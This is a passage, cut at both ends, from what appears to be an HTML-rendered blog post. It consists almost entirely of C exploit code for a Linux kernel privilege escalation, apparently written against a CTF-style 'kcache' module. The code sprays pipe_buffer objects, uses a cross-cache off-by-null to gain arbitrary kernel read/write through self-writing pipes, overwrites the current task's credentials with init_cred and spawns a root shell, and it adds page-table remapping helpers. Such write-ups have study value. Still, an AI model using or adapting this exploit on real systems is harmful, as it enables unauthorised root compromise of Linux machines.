<span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="type">void</span> *page_to_read, <span class="type">void</span> *dst)</span> &#123;</span><br><span class="line">    evil_pipe_buf[<span class="number">0</span>].offset = <span class="number">0</span>;</span><br><span class="line">    evil_pipe_buf[<span class="number">0</span>].len = <span class="number">0x1FF8</span>;</span><br><span class="line">    evil_pipe_buf[<span class="number">0</span>].page = page_to_read;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">1</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">2</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">0</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">1</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    <span class="keyword">return</span> read(pipe_fd[evil_pipe_id[<span class="number">0</span>]][<span class="number">0</span>], dst, <span class="number">0xFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="type">void</span> *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    evil_pipe_buf[<span class="number">0</span>].offset = <span class="number">0</span>;</span><br><span class="line">    evil_pipe_buf[<span class="number">0</span>].len = <span class="number">0</span>;</span><br><span class="line">    evil_pipe_buf[<span class="number">0</span>].page = page_to_write;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">1</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">2</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">0</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">1</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    <span class="keyword">return</span> write(pipe_fd[evil_pipe_id[<span class="number">0</span>]][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">self_write_pipe_init</span><span class="params">()</span> &#123;</span><br><span class="line">    prepare_pgv_system();</span><br><span class="line">    prepare_pgv_pages();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to create pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to extend pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == PIPE_SPRAY_NUM / <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; KCACHE_NUM; j++) &#123;</span><br><span class="line">                kcache_alloc(j, <span class="number">6</span>, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;sky123&quot;</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf)); <span class="comment">// 🤔 why ????</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_write(i, KCACHE_SIZE - <span class="number">6</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], buf, <span class="number">6</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(buf, <span class="string">&quot;sky123&quot;</span>, <span class="number">6</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">            orig_pipe_id[<span class="number">0</span>] = nr, victim_pip_id[<span class="number">0</span>] = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find victim: %d, orig: %d.\n&quot;</span>, victim_pip_id[<span class="number">0</span>], orig_pipe_id[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (orig_pipe_id[<span class="number">0</span>] == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to corrupt pipe_buffer.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    write(pipe_fd[victim_pip_id[<span class="number">0</span>]][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">6</span> - <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pipe_id[<span class="number">0</span>]][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pipe_id[<span class="number">0</span>]][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pipe_id[<span class="number">0</span>] || i == victim_pip_id[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to extend pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[victim_pip_id[<span class="number">0</span>]][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">6</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    read(pipe_fd[victim_pip_id[<span class="number">0</span>]][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    qword_dump(<span class="string">&quot;leak pipe_buffer&quot;</span>, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    kernel_offset = (<span class="type">size_t</span>) info_pipe_buf.ops - <span class="number">0xffffffff82451b30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">    write(pipe_fd[victim_pip_id[<span class="number">0</span>]][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pipe_id[<span class="number">0</span>] || i == victim_pip_id[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">        <span class="keyword">if</span> (nr &gt;= <span class="number">0</span> &amp;&amp; nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">            orig_pipe_id[<span class="number">1</span>] = nr;</span><br><span class="line">            victim_pip_id[<span class="number">1</span>] = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find second-level victim: %d, orig: %d.\n&quot;</span>, victim_pip_id[<span class="number">1</span>], orig_pipe_id[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_pip_id[<span class="number">1</span>] == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to corrupt second-level pipe_buffer.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    write(pipe_fd[victim_pip_id[<span class="number">1</span>]][<span class="number">1</span>], buf, <span class="keyword">sizeof</span>(info_pipe_buf) - <span class="number">6</span> - <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pipe_id[<span class="number">1</span>]][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pipe_id[<span class="number">1</span>]][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pipe_id[<span class="number">0</span>] || i == orig_pipe_id[<span class="number">1</span>] || i == victim_pip_id[<span class="number">0</span>] || i == victim_pip_id[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to extend pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_pipe_buf[i], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">        evil_pipe_buf[i].offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf[i].len = TRD_PIPE_BUF_SZ;</span><br><span class="line">        write(pipe_fd[victim_pip_id[<span class="number">1</span>]][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">        write(pipe_fd[victim_pip_id[<span class="number">1</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[i], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; PIPE_SPRAY_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == orig_pipe_id[<span class="number">0</span>] || j == orig_pipe_id[<span class="number">1</span>] || j == victim_pip_id[<span class="number">0</span>] || j == victim_pip_id[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; i; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == evil_pipe_id[k]) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line">            read(pipe_fd[j][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == info_pipe_buf.page) &#123;</span><br><span class="line">                evil_pipe_id[i] = j;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find self-writing pipe: %d\n&quot;</span>, evil_pipe_id[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (evil_pipe_id[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to build self-writing pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_pipe_buf[<span class="number">1</span>].offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_pipe_buf[<span class="number">1</span>].len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[evil_pipe_id[<span class="number">2</span>]][<span class="number">1</span>], &amp;evil_pipe_buf[<span class="number">1</span>], <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    evil_pipe_buf[<span class="number">2</span>].offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf[<span class="number">2</span>].len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="type">void</span> *) vmemmap_base + <span class="number">0x9d000</span> / <span class="number">0x1000</span> * <span class="number">0x40</span>, buf);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset + <span class="number">0xFFFFFFFF81000070</span> == buf[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find secondary_startup_64: %p\n&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] vmemmap_base: %p\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] seeking task_struct in memory...&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;1145141919810&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">        <span class="type">ssize_t</span> len = arbitrary_read_by_pipe((<span class="type">void</span> *) vmemmap_base + i * <span class="number">0x40</span>, buf);</span><br><span class="line">        <span class="type">size_t</span> *comm = memmem(buf, len, <span class="string">&quot;1145141919810&quot;</span>, <span class="number">13</span>);</span><br><span class="line">        <span class="keyword">if</span> (comm &amp;&amp; is_dir_mapping_addr(comm[<span class="number">-2</span>])</span><br><span class="line">            &amp;&amp; is_dir_mapping_addr(comm[<span class="number">-57</span>])</span><br><span class="line">            &amp;&amp; is_dir_mapping_addr(comm[<span class="number">-56</span>])) &#123;</span><br><span class="line">            current_task = comm[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line">            page_offset_base = (comm[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">            page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find currtent task_struct: %p\n&quot;</span>, current_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] page_offset_base: %p\n&quot;</span>, page_offset_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> init_cred;</span><br><span class="line">    <span class="type">size_t</span> task = current_task;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        arbitrary_read_by_pipe(direct_map_addr_to_page_addr(task), buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="type">void</span> *) direct_map_addr_to_page_addr(task) + <span class="number">0x40</span>, &amp;buf[<span class="number">0x1000</span> / <span class="number">8</span>]);</span><br><span class="line">        <span class="keyword">if</span> ((buf[((task &amp; <span class="number">0xFFF</span>) + <span class="number">0x998</span>) / <span class="number">8</span>] &amp; <span class="number">0xFFFFFFFF</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            init_cred = buf[((task &amp; <span class="number">0xFFF</span>) + <span class="number">0xB60</span>) / <span class="number">8</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find init_cred: %p\n&quot;</span>, init_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        task = buf[((task &amp; <span class="number">0xFFF</span>) + <span class="number">0x8D0</span>) / <span class="number">8</span>] - <span class="number">0x8D0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(current_task), buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span> *) direct_map_addr_to_page_addr(current_task) + <span class="number">0x40</span>, &amp;buf[<span class="number">0x1000</span> / <span class="number">8</span>]);</span><br><span class="line">    buf[((current_task &amp; <span class="number">0xFFF</span>) + <span class="number">0xB58</span>) / <span class="number">8</span>] = init_cred;</span><br><span class="line">    buf[((current_task &amp; <span class="number">0xFFF</span>) + <span class="number">0xB60</span>) / <span class="number">8</span>] = init_cred;</span><br><span class="line">    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(current_task), buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="type">void</span> *) direct_map_addr_to_page_addr(current_task) + <span class="number">0x40</span>, &amp;buf[<span class="number">0x1000</span> / <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> stack_addr, pgd_addr;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pgd_vaddr_init</span><span class="params">()</span> &#123;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(current_task), buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span> *) direct_map_addr_to_page_addr(current_task) + <span class="number">0x40</span>, &amp;buf[<span class="number">0x1000</span> / <span class="number">8</span>]);</span><br><span class="line">    stack_addr = buf[((current_task &amp; <span class="number">0xFFF</span>) + <span class="number">0x20</span>) / <span class="number">8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel stack addr: %p\n&quot;</span>, stack_addr);</span><br><span class="line">    <span class="type">size_t</span> mm_struct_addr = buf[((current_task &amp; <span class="number">0xFFF</span>) + <span class="number">0x920</span>) / <span class="number">8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mm_struct addr: %p\n&quot;</span>, mm_struct_addr);</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(mm_struct_addr), buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span> *) direct_map_addr_to_page_addr(mm_struct_addr) + <span class="number">0x40</span>, &amp;buf[<span class="number">0x1000</span> / <span class="number">8</span>]);</span><br><span class="line">    pgd_addr = buf[((mm_struct_addr &amp; <span class="number">0xFFF</span>) + <span class="number">0x48</span>) / <span class="number">8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] pgd addr: %p\n&quot;</span>, pgd_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_RW (1ULL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_NX (1ULL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_to_paddr_for_4_level</span><span class="params">(<span class="type">size_t</span> vaddr)</span> &#123;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    <span class="type">size_t</span> pud_vaddr = ((buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);</span><br><span class="line">    <span class="type">size_t</span> pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);</span><br><span class="line">    <span class="type">size_t</span> pte_vaddr = ((buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf);</span><br><span class="line">    <span class="keyword">return</span> ((buf[PTE_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) | (vaddr &amp; <span class="number">0xFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_to_paddr_for_3_level</span><span class="params">(<span class="type">size_t</span> vaddr)</span> &#123;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    <span class="type">size_t</span> pud_vaddr = ((buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);</span><br><span class="line">    <span class="type">size_t</span> pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);</span><br><span class="line">    <span class="keyword">return</span> ((buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) | (vaddr &amp; <span class="number">0x1FFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vaddr_remapping</span><span class="params">(<span class="type">size_t</span> vaddr, <span class="type">size_t</span> paddr)</span> &#123;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    <span class="type">size_t</span> pud_vaddr = ((buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    